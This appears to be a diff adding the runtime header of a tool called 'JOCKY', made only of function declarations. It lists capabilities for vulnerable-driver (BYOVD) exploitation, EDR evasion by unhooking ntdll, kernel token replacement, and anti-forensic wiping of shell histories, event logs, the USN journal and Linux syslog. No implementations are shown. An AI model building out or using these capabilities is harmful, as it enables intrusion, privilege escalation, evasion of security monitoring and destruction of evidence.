@@ -1,0 +1,63 @@
+// JOCKY Runtime Module - Core runtime functions
+
+ffi println(s: string) -> void;
+ffi string_from_i64(val: i64) -> string;
+ffi string_from_f64(val: f64) -> string;
+ffi string_from_bool(val: bool) -> string;
+ffi array_len(arr: i8*) -> i64;
+ffi array_append(arr: i8*, item: i8*) -> i8*;
+
+// BYOVD driver operations
+ffi byovd_load_driver(name: string) -> i64;
+ffi byovd_test_exploit(handle: i64) -> i32;
+ffi btr_disable_notifications() -> void;
+ffi btr_mask_module(name: string) -> void;
+
+// AI/ML engine
+ffi ai_init() -> void;
+ffi ai_collect_telemetry() -> void;
+ffi ai_score_threat() -> f64;
+
+// Plugin system
+ffi plugin_load(path: string) -> i64;
+ffi plugin_run(handle: i64, args: string) -> void;
+
+// EDR evasion
+ffi edrhoker_detect() -> void;
+ffi blindside_unhook_ntdll() -> void;
+
+// Kernel exploitation
+ffi jocky_exploit_disable_callbacks() -> void;
+ffi jocky_exploit_token_replacement(pid: i32, token: i32) -> void;
+
+// Registry operations
+ffi jocky_registry_create_key(root: i64, path: string, handle: i8*) -> bool;
+ffi jocky_registry_set_value(handle: i8*, name: string, value: string, size: i32, type_: i32) -> void;
+ffi jocky_registry_close_key(handle: i8*) -> void;
+
+// Audit system
+ffi audit_init(capacity: i32) -> void;
+ffi audit_log(category: string, action: string, detail: string, result: string) -> void;
+ffi audit_export(path: string) -> void;
+ffi audit_verify() -> i32;
+
+// Sandbox
+ffi sandbox_spawn(cmd: string, args: string) -> i64;
+ffi sandbox_set_limits(pid: i64, mem: i64, time: i64, disk: i64) -> void;
+ffi sandbox_monitor(pid: i64) -> i32;
+ffi sandbox_wait(pid: i64) -> void;
+ffi sandbox_export_trace(pid: i64, path: string) -> void;
+
+// Provenance
+ffi provenance_record(path: string, method: string, detail: string) -> void;
+
+// Forensics cleanup
+ffi forensics_wipe_powershell_history() -> void;
+ffi forensics_wipe_cmd_history() -> void;
+ffi jocky_cleanup_event_logs(logs: string) -> void;
+ffi forensics_flush_arp_cache() -> void;
+ffi forensics_clear_dns_cache() -> void;
+ffi jocky_cleanup_usn_journal() -> void;
+ffi linux_forensics_wipe_bash_history() -> void;
+ffi jocky_linux_cleanup_syslog() -> void;
+ffi jocky_linux_cleanup_journal() -> void;
